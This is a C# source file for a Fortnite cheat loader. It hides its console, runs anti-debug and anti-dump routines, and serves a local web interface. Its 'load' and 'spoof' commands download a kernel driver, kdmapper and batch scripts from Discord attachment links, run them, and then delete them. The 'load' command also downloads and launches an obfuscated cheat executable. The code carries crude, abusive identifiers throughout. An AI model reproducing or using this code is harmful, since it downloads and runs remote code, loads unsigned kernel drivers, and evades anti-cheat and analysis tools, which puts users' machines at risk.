
using Loader.Util;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using static System.Net.Mime.MediaTypeNames;

namespace CoolCockSuckedByAuxy
{
    class Program
    {

        

        [Obfuscation]
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [Obfuscation]
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [Obfuscation]
        [DllImport("User32.dll", CharSet = CharSet.Unicode)]
        public static extern int MessageBox(IntPtr h, string m, string c, int type);


        /** Console Stuff */
        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        /** Ignore */
        static bool taskill = true;
        static bool hideAllShit = true;
        static bool autoObfuscation = true;
        static string ehPleaseGetHelp = "PleaseGetHelp";
        static string allShitIsPublic = "All-Shit-Here-Is-Public-No-Need-To-Get-That";

        /** Loader Stuff */
        public static String loaderPath = "C:\\.pasterxloader";
        public static String addonPath = "C:\\.pasterxloader\\addons";


        [Obfuscation]
        static async Task Main(string[] args)
        {

            /** Protection Stuff */
            FlushMemory.Flush.Start();
            Thread startAntiDebugThread = new Thread(Anti_DebugNET.AntiDebugTools.Scanner.ScanAndKill);
            startAntiDebugThread.Priority = ThreadPriority.AboveNormal;
            startAntiDebugThread.Start();

            var handle = GetConsoleWindow();
            if (!taskill || !hideAllShit || ehPleaseGetHelp != "PleaseGetHelp" || !autoObfuscation) // cock
            {
                Util.cock();
                Environment.Exit(1337);
            }

            /** Init */
            if (!Directory.Exists(loaderPath))
                Directory.CreateDirectory(loaderPath);
            if (!Directory.Exists(addonPath))
                Directory.CreateDirectory(addonPath);

            /** Start Loader */
            ShowWindow(handle, SW_HIDE);
            AntiDump.Initialize();
            init();

            /** Create Listener */
            HttpListener listener = new HttpListener();
            listener.Prefixes.Add("http://localhost:8080/");
            listener.Start();
            OpenUrl("http://localhost:8080/");

            /** Main Loader Stuff */
            while (true)
            {


                HttpListenerContext context = await listener.GetContextAsync();
                HttpListenerRequest request = context.Request;
                HttpListenerResponse response = context.Response;
                string filePath;
                if (request.Url.LocalPath == "/")
                {
                    filePath = "C:\\Program Files\\Modified\\index.html";
                }
                else if (request.Url.LocalPath == "/main.css")
                {
                    filePath = "C:\\Program Files\\Modified\\main.css";
                }
                else if (request.Url.LocalPath == "/bg.png")
                {
                    filePath = "C:\\Program Files\\Modified\\bg.png";
                }
                else if (request.Url.LocalPath == "/font-awesome.min.css")
                {
                    filePath = "C:\\Program Files\\Modified\\font-awesome.min.css";
                }
                else if (request.Url.LocalPath == "/jquery.min.js")
                {
                    filePath = "C:\\Program Files\\Modified\\jquery.min.js";
                }
                else if (request.Url.LocalPath == "/logo.jpg")
                {
                    filePath = "C:\\Program Files\\Modified\\logo.jpg";
                }
                else if (request.Url.LocalPath == "/main.js")
                {
                    filePath = "C:\\Program Files\\Modified\\main.js";
                }
                else if (request.Url.LocalPath == "/noscript.css")
                {
                    filePath = "C:\\Program Files\\Modified\\noscript.css";
                }
                else if (request.Url.LocalPath == "/overlay.png")
                {
                    filePath = "C:\\Program Files\\Modified\\overlay.png";
                }
                else if (request.Url.LocalPath == "/skel.min.js")
                {
                    filePath = "C:\\Program Files\\Modified\\skel.min.js";
                }
                else if (request.Url.LocalPath == "/util.js")
                {
                    filePath = "C:\\Program Files\\Modified\\util.js";
                }
                else
                {
                    response.StatusCode = (int)HttpStatusCode.NotFound;
                    response.Close();
                    continue;
                }

                string fileContents = File.ReadAllText(filePath);

                // Set the content type based on the file extension
                string contentType;
                if (Path.GetExtension(filePath) == ".css")
                {
                    contentType = "text/css";
                }
                else
                {
                    contentType = "text/html";
                }
                response.ContentType = contentType;


                StreamReader reader = new StreamReader(request.InputStream, request.ContentEncoding);
                string message = reader.ReadToEnd();

                /** Stuff */
                if (message == "close")
                {
                    done();
                    Environment.Exit(1337);
                }


                if (message == "load")
                {
                    if (!Directory.Exists("C:\\Program Files\\WinRAR\\"))
                        Directory.CreateDirectory("C:\\Program Files\\WinRAR\\");

                    if (!Directory.Exists("C:\\Program Files\\"))
                        Directory.CreateDirectory("C:\\Program Files");

                    WebClient webClient = new WebClient();
                    webClient.DownloadFile("https://cdn.discordapp.com/attachments/1043212807971291197/1081291330338181170/d.sys", "C:\\Program Files\\WinRAR\\d.sys");
                    webClient.DownloadFile("https://cdn.discordapp.com/attachments/1043212807971291197/1081283824295608472/kdmapper.exe", "C:\\Program Files\\WinRAR\\mapper.exe");
                    webClient.DownloadFile("https://cdn.discordapp.com/attachments/1043212807971291197/1081299920822210570/FortniteClient-Win64-Shipping_BE.bat", "C:\\Program Files\\WinRAR\\FortniteClient-Win64-Shipping_BE.bat");
                    Thread.Sleep(1000);
                    Process.Start("C:\\Program Files\\WinRAR\\FortniteClient-Win64-Shipping_BE.bat");
                    File.Delete("C:\\Program Files\\WinRAR\\d.sys");
                    File.Delete("C:\\Program Files\\WinRAR\\mapper.exe");
                    File.Delete("C:\\Program Files\\WinRAR\\FortniteClient-Win64-Shipping_BE.bat");
                    MessageBox((IntPtr)0, "Succesfully Loaded. Press Ok in the Lobby", "Loader.exe", 0);
                    webClient.DownloadFile("https://cdn.discordapp.com/attachments/1043212807971291197/1081300835096608789/PasterX_External.vmp.exe", "C:\\Program Files\\kronicLikesDicks.exe");
                    Process.Start("C:\\Program Files\\kronicLikesDicks.exe");
                    

                }

                if (message == "spoof") 
                {
                    WebClient webClient = new WebClient();
                    webClient.DownloadFile("https://cdn.discordapp.com/attachments/1043212807971291197/1081245304977899570/ud.sys", "C:\\Program Files\\WinRAR\\udCock.sys");
                    webClient.DownloadFile("https://cdn.discordapp.com/attachments/1043212807971291197/1081283824295608472/kdmapper.exe", "C:\\Program Files\\WinRAR\\mapper.exe");
                    webClient.DownloadFile("https://cdn.discordapp.com/attachments/1043212807971291197/1081314677956542575/FortniteClient-Win64-Shipping_EAC.bat", "C:\\Program Files\\WinRAR\\FortniteClient-Win64-Shipping_EAC.bat");
                    Process.Start("C:\\Program Files\\WinRAR\\FortniteClient-Win64-Shipping_EAC.bat");
                    File.Delete("C:\\Program Files\\WinRAR\\udCock.sys");
                    File.Delete("C:\\Program Files\\WinRAR\\mapper.sys");
                    File.Delete("C:\\Program Files\\WinRAR\\FortniteClient-Win64-Shipping_EAC.bat");
                    MessageBox((IntPtr)0, "Done Spoofing", "Loader.exe", 0);

                }

                if (message == "clean")
                {
                    
                    Util.cleanFirst();
                   
                }


                byte[] buffer = Encoding.UTF8.GetBytes(fileContents);
                response.ContentLength64 = buffer.Length;
                Stream output = response.OutputStream;
                await output.WriteAsync(buffer, 0, buffer.Length);
                output.Close();


            }
        }


        [Obfuscation]
        public static void init()
        {
            WebClient wb = new WebClient();

            if (!Directory.Exists("C:\\Program Files\\Modified"))
                Directory.CreateDirectory("C:\\Program Files\\Modified");
           
            wb.DownloadFile("https://cdn.discordapp.com/attachments/927614185515405404/1081254257757532160/index.html", "C:\\Program Files\\Modified\\index.html");
            wb.DownloadFile("https://cdn.discordapp.com/attachments/927614185515405404/1081253224612364298/logo.jpg", "C:\\Program Files\\Modified\\logo.jpg");
            wb.DownloadFile("https://cdn.discordapp.com/attachments/927614185515405404/1081253224184557678/jquery.min.js", "C:\\Program Files\\Modified\\jquery.min.js");
            wb.DownloadFile("https://cdn.discordapp.com/attachments/927614185515405404/1081254258063704134/main.css", "C:\\Program Files\\Modified\\main.css");
            wb.DownloadFile("https://cdn.discordapp.com/attachments/927614185515405404/1081253225346379967/main.js", "C:\\Program Files\\Modified\\main.js");
            wb.DownloadFile("https://cdn.discordapp.com/attachments/927614185515405404/1081253225757413417/noscript.css", "C:\\Program Files\\Modified\\noscript.js");
            wb.DownloadFile("https://cdn.discordapp.com/attachments/927614185515405404/1081253226252349480/overlay.png", "C:\\Program Files\\Modified\\overlay.png");
            wb.DownloadFile("https://cdn.discordapp.com/attachments/927614185515405404/1081253249325203456/bg.png", "C:\\Program Files\\Modified\\bg.png");
            wb.DownloadFile("https://cdn.discordapp.com/attachments/927614185515405404/1081253249581060096/font-awesome.min.css", "C:\\Program Files\\Modified\\font-awesome.min.css");
            wb.DownloadFile("https://cdn.discordapp.com/attachments/927614185515405404/1081253249962758274/skel.min.js", "C:\\Program Files\\Modified\\skel.min.js");
            wb.DownloadFile("https://cdn.discordapp.com/attachments/927614185515405404/1081253250386366604/util.js", "C:\\Program Files\\Modified\\util.js");;

        }

        [Obfuscation]
        public static void done()
        {
            File.Delete("C:\\Program Files\\Modified\\index.html");
            File.Delete("C:\\Program Files\\Modified\\logo.jpg");
            File.Delete("C:\\Program Files\\Modified\\jquery.min.js");
            File.Delete("C:\\Program Files\\Modified\\main.css");
            File.Delete("C:\\Program Files\\Modified\\main.js");
            File.Delete("C:\\Program Files\\Modified\\noscript.js");
            File.Delete("C:\\Program Files\\Modified\\overlay.png");
            File.Delete("C:\\Program Files\\Modified\\bg.png");
            File.Delete("C:\\Program Files\\Modified\\font-awesome.min.css");
            File.Delete("C:\\Program Files\\Modified\\skel.min.js");
            File.Delete("C:\\Program Files\\Modified\\util.js");
            Directory.Delete("C:\\Program Files\\Modified");

            Process.Start("taskkill", "/F /IM kronicLikesDicks.exe");
            File.Delete("C:\\Program Files\\kronicLikesDicks.exe");
        }


        public static void OpenUrl(string url)
        {
            try
            {
                Process.Start(url);
            }
            catch
            {
                // hack because of this: https://github.com/dotnet/corefx/issues/10361
                if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
                {
                    url = url.Replace("&", "^&");
                    Process.Start(new ProcessStartInfo(url) { UseShellExecute = true });
                }
                else if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux))
                {
                    Process.Start("xdg-open", url);
                }
                else if (RuntimeInformation.IsOSPlatform(OSPlatform.OSX))
                {
                    Process.Start("open", url);
                }
                else
                {
                    throw;
                }
            }
        }
    }
}
